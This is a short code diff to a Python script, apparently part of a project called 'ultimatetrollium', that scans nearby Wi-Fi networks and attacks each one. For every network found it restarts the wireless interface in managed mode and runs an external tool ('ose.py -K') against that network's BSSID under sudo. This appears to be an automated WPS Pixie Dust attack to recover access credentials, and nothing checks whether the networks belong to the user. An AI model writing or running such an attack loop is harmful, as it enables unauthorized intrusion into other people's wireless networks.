@@ -2,8 +2,12 @@
 
 import nmcli
 import os
+import subprocess
+import time
+
 
 INTERFACE = os.getenv("INTERFACE")
+TIMEOUT = 60
 
 def scan(interface: str, rescan: bool=True):
     nmcli.device.wifi_rescan(ifname=interface)
@@ -11,6 +15,10 @@ def scan(interface: str, rescan: bool=True):
 
 
 def main_loop():
+    print("This script can be stopped with ctrl+z")
+    print("The outputs will be saved in the start script directory (ultimatetrollium/reports)")
+    time.sleep(3)
+
     networks = scan(INTERFACE, True)
 
     print(f"Networks found:\n")
@@ -30,8 +38,12 @@ def main_loop():
 
         print(f"Target: {ssid}, {network.bssid}\n")
 
+        # The interface should always restart before running the attack
+        subprocess.run(f"sudo ifconfig {INTERFACE} down", shell=True)
+        subprocess.run(f"sudo iwconfig {INTERFACE} mode managed", shell=True)
+        subprocess.run(f"sudo ifconfig {INTERFACE} up", shell=True)
 
-    
+        subprocess.run(f"timeout {TIMEOUT} sudo ../ose/ose.py -i {INTERFACE} -K -F --bssid {network.bssid}", shell=True)
 
 
 if __name__ == "__main__":
